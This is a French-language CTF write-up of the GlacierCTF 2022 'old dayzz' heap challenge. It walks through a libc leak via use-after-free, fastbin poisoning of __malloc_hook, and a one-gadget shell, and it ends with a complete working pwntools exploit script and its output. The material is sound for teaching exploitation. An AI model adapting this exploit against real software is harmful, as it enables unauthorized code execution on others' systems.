---
title: GlacierCTF 2022 - old dayzz
date: 2024-11-04
tags: 
- heap exploitation
- fastbin dup
- use after free
category: 
- pwn
---

# Découverte du challenge

file
```
old_patched: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ld-2.23.so, BuildID[sha1]=4f6f28c5a2bf3d83d6253770124995e1b6719342, for GNU/Linux 3.2.0, not stripped
```

checksec
```
gef➤  checksec
[+] checksec for '/home/x86/shared/pwn/heap/Fastbin-dup/GlacierCTF2022-old_dayz/app/old_patched'
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✓ 
Fortify                       : ✘ 
RelRO                         : Partial
```


En affichant le menu du challenge, on comprend vite que cela va être de l'exploitation de heap.

```c
[1] Add
[2] Delete
[3] Write
[4] View
[5] Exit
>
```

Version de glibc utilisée : 

```sh
GNU C Library (Ubuntu GLIBC 2.23-0ubuntu11.3) stable release version 2.23, by Roland McGrath et al.
```


Avant toute chose, nous devons obtenir un leak de la libc. Cela nous sera utile pour obtenir un shell.
Pour ce faire, on va utiliser les deux premières fonctions.
On ajoute donc deux chunk d'une taille assez grande (ici 0x80) pour qu'ils finissent dans ```unsortedbin```.

```c
pwndbg> vis

0x55555555b000	0x0000000000000000	0x0000000000000091	................   <-- Premier chunk
0x55555555b010	0x0000000000000000	0x0000000000000000	................
0x55555555b020	0x0000000000000000	0x0000000000000000	................
0x55555555b030	0x0000000000000000	0x0000000000000000	................
0x55555555b040	0x0000000000000000	0x0000000000000000	................
0x55555555b050	0x0000000000000000	0x0000000000000000	................
0x55555555b060	0x0000000000000000	0x0000000000000000	................
0x55555555b070	0x0000000000000000	0x0000000000000000	................
0x55555555b080	0x0000000000000000	0x0000000000000000	................
0x55555555b090	0x0000000000000000	0x0000000000000091	................   <-- Deuxième chunk
0x55555555b0a0	0x0000000000000000	0x0000000000000000	................
0x55555555b0b0	0x0000000000000000	0x0000000000000000	................
0x55555555b0c0	0x0000000000000000	0x0000000000000000	................
0x55555555b0d0	0x0000000000000000	0x0000000000000000	................
0x55555555b0e0	0x0000000000000000	0x0000000000000000	................
0x55555555b0f0	0x0000000000000000	0x0000000000000000	................
0x55555555b100	0x0000000000000000	0x0000000000000000	................
0x55555555b110	0x0000000000000000	0x0000000000000000	................
0x55555555b120	0x0000000000000000	0x0000000000020ee1	................   <-- Top chunk
```

Par la suite, on free le premier chunk, malloc va alors l'ajouter dans ```unsortedbin```. 

```c
pwndbg> vis

0x55555555b000	0x0000000000000000	0x0000000000000091	................   <-- unsortedbin[all][0]
0x55555555b010	0x00007ffff7dd1b78	0x00007ffff7dd1b78	x.......x.......   // Les pointeurs FD et BK 
0x55555555b020	0x0000000000000000	0x0000000000000000	................   // sont set à l'adresse du
0x55555555b030	0x0000000000000000	0x0000000000000000	................   // fake chunk de unsortedbin
0x55555555b040	0x0000000000000000	0x0000000000000000	................   // dans la main_arena
0x55555555b050	0x0000000000000000	0x0000000000000000	................
0x55555555b060	0x0000000000000000	0x0000000000000000	................
0x55555555b070	0x0000000000000000	0x0000000000000000	................
0x55555555b080	0x0000000000000000	0x0000000000000000	................
0x55555555b090	0x0000000000000090	0x0000000000000090	................   <-- Deuxième chunk
0x55555555b0a0	0x0000000000000000	0x0000000000000000	................
0x55555555b0b0	0x0000000000000000	0x0000000000000000	................
0x55555555b0c0	0x0000000000000000	0x0000000000000000	................
0x55555555b0d0	0x0000000000000000	0x0000000000000000	................
0x55555555b0e0	0x0000000000000000	0x0000000000000000	................
0x55555555b0f0	0x0000000000000000	0x0000000000000000	................
0x55555555b100	0x0000000000000000	0x0000000000000000	................
0x55555555b110	0x0000000000000000	0x0000000000000000	................
0x55555555b120	0x0000000000000000	0x0000000000020ee1	................   <-- Top chunk
```

Au moment de free le chunk, malloc va se servir des deux premiers quadword des users data comme deux pointeurs FD et BK.

```c
static void _int_free (mstate av, mchunkptr p, int have_lock){
...
	
	bck = unsorted_chunks(av);
	fwd = bck->fd;
	if (__glibc_unlikely (fwd->bk != bck))
	{
	      errstr = "free(): corrupted unsorted chunks";
	      goto errout;
	}
	p->fd = fwd;
	p->bk = bck;
	if (!in_smallbin_range(size))
	{
	      p->fd_nextsize = NULL;
	      p->bk_nextsize = NULL;
	}
	bck->fd = p;
	fwd->bk = p;
	
	set_head(p, size | PREV_INUSE);
	set_foot(p, size);
	
	check_free_chunk(av, p);
...
}
```


Fonctionnant en FIFO, le chunk est donc ajouté sur la ```HEAD``` de la liste de ```unsortedbin```, FD et BK pointent donc sur le fake chunk de l'unsortedbin dans la ```main_arena```.

```c
pwndbg> dq &main_arena 14
00007ffff7dd1b20     0000000100000000 0000000000000000
00007ffff7dd1b30     0000000000000000 0000000000000000
00007ffff7dd1b40     0000000000000000 0000000000000000
00007ffff7dd1b50     0000000000000000 0000000000000000
00007ffff7dd1b60     0000000000000000 0000000000000000
00007ffff7dd1b70     0000000000000000 000055555555b120
00007ffff7dd1b80     0000000000000000 000055555555b000
```

On peut maintenant utiliser la méthode ```view()``` pour lire un chunk par index. 
Cette fonction ne vérifie pas si le chunk libre ou non, on peut donc lire le premier chunk et obtenir ce que contient les users data du premier chunk : l'adresse de ```unsortedbin``` dans la ```main_arena```.

## Libc leak
Pour trouver l'adresse de base de la libc, on prend la différence entre l'adresse leaked de la ```main_arena``` et on lui soustrait l'adresse d'un fonction dont l'offset est connu (ex: puts)
Puis, on additionne cette différence avec l'offset de ```puts``` dans la libc.
Pour finir, on soustrait cette somme avec l'adresse leak pour obtenir l'adresse de base.


```python
## leak libc addr
add(0, 0x80)
add(1, 0x80)

delete(0)
leak = view(0)

libc.address = u64(leak.ljust(8,b"\x00")) -  (0x3554d8 + libc.sym.puts)
info(f"LIBC: {hex(libc.address)}")
```

Pour leak l'adresse, nous devons faire deux requêtes à minima. Si nous essayons d'allouer qu'un seul chunk, lors du free, il viendra consolider le ```top chunk``` et notre plan tombera à l'eau. 

```c
static void _int_free (mstate av, mchunkptr p, int have_lock){
...
 /*
    If the chunk borders the current high end of memory,
	consolidate into top
*/

else {
    size += nextsize;
    set_head(p, size | PREV_INUSE);
    av->top = p;
	check_chunk(av, p);
}
...
```

## Double free

Les fonctions nous permettant de contrôler l'index du chunk que l'on manipule, sans vérifier si le chunk est free ou non, cela devient assez simple:

```python
add(2, 0x68)
delete(2)
write(2, p64(libc.sym.__malloc_hook-35))
```

## Arbitrary write

Pour finir on écrase \_\_malloc\_hook avec l'adresse de notre gadget.

```python
add(3,0x68)
add(4,0x68)
write(4 , b"A" * 19 + p64(libc.address + gadget))
```

### Output
```bash
pwn@research:~/heap/Fastbin-dup/GlacierCTF2022-old_dayz/app$ python xpl.py 
[*] '/home/pwn/heap/Fastbin-dup/GlacierCTF2022-old_dayz/app/libc-2.23.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './old_patched': pid 14712
[*] LIBC: 0x7f27ae443000
[*] Switching to interactive mode

$ cat flag.txt
glacierctf{pwn_1S_Th3_0nly_r3al_c4t3G0ry_4nyw4y}
```


## Full exploit
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch='i386')
exe = './old_patched'

libc = ELF("./libc-2.23.so")


def sla(delim, line): return io.sendlineafter(delim, line)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def add(idx,size):
    sla(b"> ", b"1")
    sla(b"idx:", f"{idx}".encode())
    sla(b"size:", f"{size}".encode())

def delete(idx):
    sla(b"> ", b"2")
    sla(b"idx:", f"{idx}".encode())

def write(idx, content):
    sla(b"> ", b"3")
    sla(b"idx:", f"{idx}".encode())
    sla(b"contents:", content)

def view(idx):
    sla(b"> ", b"4")
    sla(b"idx:",f"{idx}".encode())
    io.recvuntil(b"data: ")
    leak = io.recvuntil(b"[").rstrip(b"[")
    return leak

gdbscript = '''
continue
'''.format(**locals())

gadget = 0x4527a

io = start()

## leak libc addr
add(0, 0x80)
add(1, 0x80)

delete(0)
leak = view(0)

libc.address = u64(leak.ljust(8,b"\x00")) -  (0x3554d8 + libc.sym.puts)
info(f"LIBC: {hex(libc.address)}")

## double free
add(2, 0x68)
delete(2)
write(2, p64(libc.sym.__malloc_hook-35))

# poison
add(3,0x68)
add(4,0x68)
write(4 , b"A" * 19 + p64(libc.address + gadget))

# pop a shell
add(5, 6)

io.interactive()
```
